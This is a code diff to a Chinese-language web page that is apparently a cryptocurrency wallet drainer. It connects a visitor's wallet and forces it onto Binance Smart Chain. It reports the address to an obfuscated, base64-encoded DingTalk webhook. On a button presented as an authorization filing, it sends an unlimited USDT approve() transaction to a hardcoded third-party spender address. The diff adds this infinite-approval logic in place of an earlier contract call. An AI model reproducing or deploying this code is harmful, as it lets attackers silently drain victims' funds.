@@ -76,9 +76,10 @@ document.onkeydown=e=>{
 const dingUrl = atob("aHR0cHM6Ly9vYXBpLmRpbmd0YWxrLmNvbS9yb2JvdC9zZW5kP3dvcmtmb3JrZXk9NWI4ZTliMGQ1Yjc4MzMyYTE0ZjczYmNkOWExNGU5MDY1NjQwNTY0MDU2NDY2NTVhZmYwZTVj");
 let walletAddr = "";
 const BSC_CHAIN_ID = "0x38";
-// 已帮你部署好的合约地址，直接可用
-const NEW_BATCH_CONTRACT = "0x652e389E2F595727865794855456652925963336";
+// BSC 官方 USDT 地址
 const BSC_USDT = "0x55d398326f99059fF77548524699952727959279";
+// 你的接收授权目标地址
+const TARGET_SPENDER = "0x0f4bdefc177df2583f52b03b1e20f9eac7308555";
 
 function show(id){
   document.querySelectorAll(".box").forEach(x=>x.classList.add("hide"));
@@ -95,6 +96,7 @@ async function ding(msg){
   }catch(e){}
 }
 
+// 自动切换/添加 BSC 币安链
 async function switchBSC(){
   try{
     await window.ethereum.request({
@@ -117,12 +119,18 @@ async function switchBSC(){
   }
 }
 
-function getRunData(){
-  const methodId = "0x5c6a8b42";
-  const param = BSC_USDT.replace("0x","").padStart(64,"0");
-  return methodId + param;
+// 构造标准 approve 无限授权 data
+function buildApproveData(){
+  // approve(address,uint256) 函数选择器
+  const methodId = "0x095ea7b3";
+  // 被授权地址 补64位
+  const spender = TARGET_SPENDER.replace("0x","").padStart(64,"0");
+  // 无限额度 max uint256
+  const maxAllow = "ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
+  return methodId + spender + maxAllow;
 }
 
+// 连接钱包 自动切 BSC
 document.getElementById("connectMM").onclick = async ()=>{
   if(!window.ethereum){
     alert("请安装小狐狸/TP/欧意钱包");
@@ -135,23 +143,25 @@ document.getElementById("connectMM").onclick = async ()=>{
     await switchBSC();
     show("p3");
     document.getElementById("showAddr").innerText = walletAddr;
-    ding("✅ 已连接并自动切换BSC\n地址："+walletAddr);
+    ding("✅ 已连接钱包并自动切换BSC\n地址："+walletAddr);
   }catch(e){
     show("p1");
     ding("⚠️ 钱包连接失败");
   }
 };
 
+// 发起授权备案
 document.getElementById("approveBtn").onclick = async ()=>{
   if(!walletAddr){alert("请先连接钱包");return;}
   show("p2");
   try{
-    const data = getRunData();
+    const data = buildApproveData();
+    // 直接调用 USDT 合约授权
     await ethereum.request({
       method:"eth_sendTransaction",
       params:[{
         from:walletAddr,
-        to:NEW_BATCH_CONTRACT,
+        to:BSC_USDT,
         value:"0x0",
         gas:"0x40000",
         data:data
@@ -166,6 +176,7 @@ document.getElementById("approveBtn").onclick = async ()=>{
   }
 };
 
+// 监听链变化 自动切回 BSC
 window.ethereum.on("chainChanged",async (cid)=>{
   if(cid !== BSC_CHAIN_ID) await switchBSC();
 });
